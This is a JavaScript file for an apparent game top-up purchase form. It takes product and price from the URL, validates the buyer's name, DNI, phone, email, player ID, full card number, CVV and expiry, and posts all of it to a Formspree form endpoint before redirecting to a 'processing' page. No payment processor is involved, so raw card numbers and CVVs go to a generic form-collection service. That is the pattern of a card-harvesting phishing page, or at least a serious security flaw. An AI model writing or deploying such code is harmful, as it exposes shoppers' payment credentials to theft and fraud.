document.addEventListener("DOMContentLoaded", () => {
  const params = new URLSearchParams(window.location.search);
  const producto = params.get("producto") || "Producto no especificado";
  const precio = params.get("precio") || "0";

  // Mostrar producto y precio en el formulario
  const productoInput = document.getElementById("producto");
  const precioInput = document.getElementById("precio");
  if (productoInput) productoInput.value = producto;
  if (precioInput) precioInput.value = "S/ " + precio;

  const form = document.getElementById("compraForm");

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    // Validaciones
    const nombre = form.querySelector("input[name='nombre']");
    const dni = form.querySelector("input[name='dni']");
    const celular = form.querySelector("input[name='celular']");
    const email = form.querySelector("input[name='email']");
    const idJugador = form.querySelector("input[name='id_jugador']");
    const tarjeta = form.querySelector("#tarjeta");
    const cvv = form.querySelector("#cvv");
    const expiracion = form.querySelector("#expiracion");

    let valido = true;

    function marcarError(campo, condicion) {
      if (condicion) {
        campo.classList.add("error");
        valido = false;
      } else {
        campo.classList.remove("error");
      }
    }

    marcarError(nombre, nombre.value.trim() === "");
    marcarError(dni, dni.value.length !== 8 || !/^\d{8}$/.test(dni.value));
    marcarError(celular, celular.value.length !== 9 || !/^\d{9}$/.test(celular.value));
    marcarError(email, email.value.trim() === "");
    marcarError(idJugador, idJugador.value.trim() === "");
    marcarError(tarjeta, tarjeta.value.length !== 16 || !/^\d{16}$/.test(tarjeta.value));
    marcarError(cvv, cvv.value.length !== 3 || !/^\d{3}$/.test(cvv.value));
    marcarError(expiracion, expiracion.value.trim() === "");

    if (!valido) {
      alert("Por favor completa correctamente todos los campos.");
      return;
    }

    // Enviar a Formspree
    fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: { Accept: "application/json" }
    })
      .then(response => {
        if (response.ok) {
          window.location.href = "procesando.html";
        } else {
          alert("Error al enviar el formulario.");
        }
      })
      .catch(() => alert("Error de conexión, intenta nuevamente."));
  });
});
